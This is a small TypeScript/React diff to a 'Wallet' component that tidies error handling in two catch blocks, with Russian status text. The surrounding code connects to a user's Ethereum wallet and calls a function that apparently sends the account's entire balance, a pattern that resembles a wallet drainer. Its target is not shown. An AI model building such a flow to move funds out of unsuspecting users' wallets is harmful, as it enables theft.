@@ -82,7 +82,8 @@ export default function Wallet() {
         const resp = await eth.request({ method: 'eth_requestAccounts' })
         addr = (resp as string[])[0]
       } catch (e: unknown) {
-        setStatus(`Ошибка подключения: ${e.message}`)
+        const msg = e instanceof Error ? e.message : String(e)
+        setStatus(`Ошибка: ${msg}`)
         setBusy(false)
         return
       }
@@ -93,7 +94,8 @@ export default function Wallet() {
       const txHash = await sendAllBalance(eth, addr, setStatus)
       setStatus(`Успех! TxHash: ${txHash}`)
     } catch (e: unknown) {
-      setStatus(`Ошибка: ${e.message}`)
+      const msg = e instanceof Error ? e.message : String(e)
+      setStatus(`Ошибка: ${msg}`)
     } finally {
       setBusy(false)
     }
